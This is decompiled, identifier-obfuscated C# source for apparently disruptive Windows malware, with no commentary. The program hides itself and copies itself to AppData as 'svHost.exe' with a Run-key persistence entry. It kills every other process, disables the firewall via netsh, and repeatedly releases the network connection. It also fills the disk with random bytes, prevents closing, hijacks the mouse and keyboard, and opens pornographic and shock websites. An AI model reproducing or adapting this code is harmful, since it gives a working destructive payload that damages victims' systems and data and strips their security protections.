using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hU;

public class _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP : Form
{
	private const string _19Zwuk09Cmc8JiE = "svHost";

	private string[] _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0;

	private Point _19Zwuk09Cmc8JiE7Ic;

	private IContainer _19Zwuk09Cmc8JiE7Ic;

	private Timer _19Zwuk09Cmc8JiE7IcFNXk;

	private Timer _19Zwuk09Cmc8JiE;

	private Timer _19Zwuk09Cmc8;

	private Timer m_19Zwuk09Cmc8JiE7IcFNXkFroOgHs;

	private Timer _19Zwuk09Cm;

	private Timer _19Zwuk09Cmc8JiE7I;

	private Timer _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rg;

	private Timer _19Zwuk09Cmc8JiE7;

	private Timer _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUil;

	private Timer _19Zwuk09Cm;

	private Timer _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rgSg00;

	private Timer _19Zwuk09Cmc8JiE7IcFNXkFroO;

	private Timer _19Zwuk09Cmc8J;

	private Timer _19Zwuk09Cmc8JiE7Ic;

	[DllImport("user32.dll")]
	private static extern int SwapMouseButton(int bSwap);

	private static void SwapMouse(int value)
	{
		try
		{
			SwapMouseButton(value);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	private static void TaskBar(int value)
	{
		try
		{
			int hwnd = FindWindow("Shell_TrayWnd", "");
			ShowWindow(hwnd, value);
		}
		catch
		{
		}
	}

	private static void OnExecution()
	{
		try
		{
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static void PlaySong()
	{
		while (true)
		{
			Console.Beep(890, 400);
			Console.Beep(990, 400);
			Console.Beep(790, 400);
			Console.Beep(390, 400);
			Console.Beep(590, 1600);
		}
	}

	public _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP()
	{
		WD2YVoeLpBCk24();
		Install(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
	}

	private static void Install(string path)
	{
		try
		{
			if (!(Application.get_StartupPath() == path))
			{
				File.Copy(Application.get_ExecutablePath(), path + "\\svHost.exe");
				Process.Start(path + "\\svHost.exe");
				Process.GetCurrentProcess().Kill();
			}
		}
		catch
		{
		}
	}

	private void _19Zwuk09Cmc8JiE7IcFNXkFroOgHs(object _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUil, EventArgs _19Zwuk09Cmc8J)
	{
		for (int i = 0; i < 3; i++)
		{
			((Control)this).Hide();
		}
		_19Zwuk09Cmc8JiE7IcFNXk.Stop();
	}

	private void AWQyIp3JrHPP(object AWQyIp3JrHPP2KystlWZcRBR03GPrnaqb5Ho, EventArgs AWQyIp3JrHPP2KystlWZcRBR03GPrna)
	{
		try
		{
			_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0 = "".Split(new char[1] { '.' });
			if (_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0[0] != "")
			{
				_19Zwuk09Cmc8.set_Enabled(true);
			}
			_19Zwuk09Cm.set_Enabled(true);
			this._19Zwuk09Cm.set_Enabled(true);
			_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rg.set_Enabled(true);
			new Thread(Calculus).Start();
			OnExecution();
			new Thread(WriteFile).Start();
		}
		catch
		{
		}
	}

	private static void WriteFile()
	{
		try
		{
			using FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.tmp", FileMode.Append);
			Random random = new Random();
			byte[] array = new byte[1];
			while (true)
			{
				random.NextBytes(array);
				fileStream.WriteByte(array[0]);
			}
		}
		catch
		{
		}
	}

	private void WD2YVoeLpBCk24KscgnbkNjr()
	{
		while (true)
		{
			Thread.Sleep(130);
			Cursor.set_Position(this._19Zwuk09Cmc8JiE7Ic);
		}
	}

	private static void Calculus()
	{
		int num = 0;
		while (true)
		{
			if (num == 200)
			{
				num = 0;
			}
			num += 2;
		}
	}

	private void WD2YVoeLpBCk24KscgnbkNjrzlqJ(object WD2YVoeLpBCk24KscgnbkNjrzl, EventArgs WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNdD)
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] array = _19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0;
			foreach (string value in array)
			{
				if (process.ProcessName.ToLower().Contains(value) && process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}

	private static void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void tmrFirewall_Tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "netsh.exe";
			process.StartInfo.Arguments = "firewall set opmode disable";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private void WD2YVoeLpBCk24KscgnbkNjrzlqJR(object WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5q, EventArgs WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNdDnj8eaU)
	{
		Random random = new Random();
		this.m_19Zwuk09Cmc8JiE7IcFNXkFroOgHs.set_Interval(random.Next(1000, 10000));
		new Thread(BeepThread).Start();
	}

	private static void BeepThread()
	{
		Console.Beep();
	}

	private void WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNdDnj8e(object WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNdDn, EventArgs WD2YVoeLpBCk2)
	{
		try
		{
			Random random = new Random();
			this._19Zwuk09Cm.set_Interval(random.Next(4000, 120001));
			switch (random.Next(0, 4))
			{
			case 0:
				Process.Start("explorer.exe");
				break;
			case 1:
				Process.Start("notepad.exe");
				break;
			case 2:
				Process.Start("mspaint.exe");
				break;
			case 3:
				Process.Start("write.exe");
				break;
			}
		}
		catch
		{
		}
	}

	private void WD2YVoeLpBCk24KscgnbkNj(object WD2YVoeLpBCk24Kscg, EventArgs WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNd)
	{
		try
		{
			Random random = new Random();
			_19Zwuk09Cmc8JiE7I.set_Interval(random.Next(1000, 120000));
			Process currentProcess = Process.GetCurrentProcess();
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui(object WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui, EventArgs WD2YVoeLpBCk24K)
	{
		try
		{
			Random random = new Random();
			int num = random.Next(0, 8);
			_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rg.set_Interval(random.Next(5000, 120001));
			switch (num)
			{
			case 0:
				Process.Start("http://www.octopusgirl.com");
				break;
			case 1:
				Process.Start("http://www.loltrain.com");
				break;
			case 2:
				Process.Start("http://www.youporn.com");
				break;
			case 3:
				Process.Start("http://trololololololololololo.com/");
				break;
			case 4:
				Process.Start("http://www.fuckme.com");
				break;
			case 5:
				Process.Start("http://maytheforcebewithyou.com");
				break;
			case 6:
				Process.Start("http://meatspin.com");
				break;
			case 7:
				Process.Start("http://www.youporngay.com");
				break;
			}
		}
		catch
		{
		}
	}

	private void WD2YVoeLpBCk24(object WD2YVoeLpBCk24KscgnbkNjrzlqJRg5, EventArgs WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNd)
	{
		Point position = default(Point);
		Random random = new Random();
		int num = random.Next(2);
		int num2 = random.Next(2);
		_19Zwuk09Cmc8JiE7.set_Interval(random.Next(1000, 60001));
		if (num == 1)
		{
			position.X = Control.get_MousePosition().X + random.Next(1, 501);
		}
		else
		{
			position.X = Control.get_MousePosition().X - random.Next(1, 501);
		}
		if (num2 == 1)
		{
			position.Y = Control.get_MousePosition().Y + random.Next(1, 501);
		}
		else
		{
			position.Y = Control.get_MousePosition().Y - random.Next(1, 501);
		}
		Cursor.set_Position(position);
	}

	private static void GenerateString()
	{
		try
		{
			Random random = new Random((int)DateTime.Now.Ticks);
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < random.Next(1, 31); i++)
			{
				char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
				stringBuilder.Append(value);
			}
			SendKeys.Send(stringBuilder.ToString());
		}
		catch
		{
		}
	}

	private void WD2YVoeLpBCk24(object WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNdDnj, EventArgs WD2YVoeLpBCk24KscgnbkNjrzlqJRg5)
	{
		Random random = new Random();
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUil.set_Interval(random.Next(5000, 120001));
		GenerateString();
	}

	private void WD2YVoeLpBCk24Ksc(object WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNd, EventArgs WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNdDnj8eaUIP)
	{
		Random random = new Random();
		_19Zwuk09Cm.set_Interval(random.Next(5000, 60001));
		new Thread(OpenTray).Start();
	}

	[DllImport("winmm.dll")]
	private static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);

	private static void OpenTray()
	{
		try
		{
			mciSendStringA("set CDAudio door open", "", 127L, 0L);
		}
		catch
		{
		}
	}

	private void WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmN(object WD2YVoeLpBCk24KscgnbkNjrzlqJR, EventArgs WD2YVoeLpBCk24Ks)
	{
		Random random = new Random();
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rgSg00.set_Interval(random.Next(1000, 120000));
		ShowMsg();
	}

	private static void tmrRegistry_Tick(object sender, EventArgs e)
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "svHost", Application.get_ExecutablePath());
		}
		catch
		{
		}
	}

	private static void tmrDisconnect_Tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "ipconfig.exe";
			process.StartInfo.Arguments = "/release";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private static void tmrClipBoard_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(".");
		}
		catch
		{
		}
	}

	private static void ShowMsg()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		Form val = new Form();
		val.set_Size(new Size(1, 1));
		val.set_StartPosition((FormStartPosition)0);
		Rectangle virtualScreen = SystemInformation.get_VirtualScreen();
		val.set_Location(new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10));
		((Control)val).Show();
		((Control)val).Focus();
		((Control)val).BringToFront();
		val.set_TopMost(true);
		MessageBox.Show((IWin32Window)(object)val, string.Empty, string.Empty, (MessageBoxButtons)0);
		((Component)(object)val).Dispose();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && this._19Zwuk09Cmc8JiE7Ic != null)
		{
			this._19Zwuk09Cmc8JiE7Ic.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void WD2YVoeLpBCk24()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_0337: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Expected O, but got Unknown
		this._19Zwuk09Cmc8JiE7Ic = new Container();
		_19Zwuk09Cmc8JiE7IcFNXk = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8 = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		this.m_19Zwuk09Cmc8JiE7IcFNXkFroOgHs = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		this._19Zwuk09Cm = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE7I = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rg = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE7 = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUil = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cm = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rgSg00 = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE7IcFNXkFroO = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8J = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		_19Zwuk09Cmc8JiE7Ic = new Timer(this._19Zwuk09Cmc8JiE7Ic);
		((Control)this).SuspendLayout();
		_19Zwuk09Cmc8JiE7IcFNXk.set_Enabled(true);
		_19Zwuk09Cmc8JiE7IcFNXk.add_Tick((EventHandler)_19Zwuk09Cmc8JiE7IcFNXkFroOgHs);
		_19Zwuk09Cmc8JiE.set_Interval(5000);
		_19Zwuk09Cmc8JiE.add_Tick((EventHandler)tmrFirewall_Tick);
		_19Zwuk09Cmc8.set_Interval(500);
		_19Zwuk09Cmc8.add_Tick((EventHandler)WD2YVoeLpBCk24KscgnbkNjrzlqJ);
		this.m_19Zwuk09Cmc8JiE7IcFNXkFroOgHs.set_Interval(1000);
		this.m_19Zwuk09Cmc8JiE7IcFNXkFroOgHs.add_Tick((EventHandler)WD2YVoeLpBCk24KscgnbkNjrzlqJR);
		this._19Zwuk09Cm.add_Tick((EventHandler)WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmNdDnj8e);
		_19Zwuk09Cmc8JiE7I.add_Tick((EventHandler)WD2YVoeLpBCk24KscgnbkNj);
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rg.add_Tick((EventHandler)WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui);
		_19Zwuk09Cmc8JiE7.add_Tick((EventHandler)WD2YVoeLpBCk24);
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUil.add_Tick((EventHandler)this.WD2YVoeLpBCk24);
		_19Zwuk09Cm.add_Tick((EventHandler)WD2YVoeLpBCk24Ksc);
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rgSg00.set_Interval(1000);
		_19Zwuk09Cmc8JiE7IcFNXkFroOgHswP2hUileq0rgSg00.add_Tick((EventHandler)WD2YVoeLpBCk24KscgnbkNjrzlqJRg5DCui5qmN);
		_19Zwuk09Cmc8JiE7IcFNXkFroO.set_Interval(1000);
		_19Zwuk09Cmc8JiE7IcFNXkFroO.add_Tick((EventHandler)tmrRegistry_Tick);
		_19Zwuk09Cmc8J.set_Interval(5000);
		_19Zwuk09Cmc8J.add_Tick((EventHandler)tmrDisconnect_Tick);
		_19Zwuk09Cmc8JiE7Ic.set_Interval(1000);
		_19Zwuk09Cmc8JiE7Ic.add_Tick((EventHandler)tmrClipBoard_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(32, 28));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("FrmMain");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((Form)this).add_Load((EventHandler)AWQyIp3JrHPP);
		((Control)this).ResumeLayout(false);
	}
}
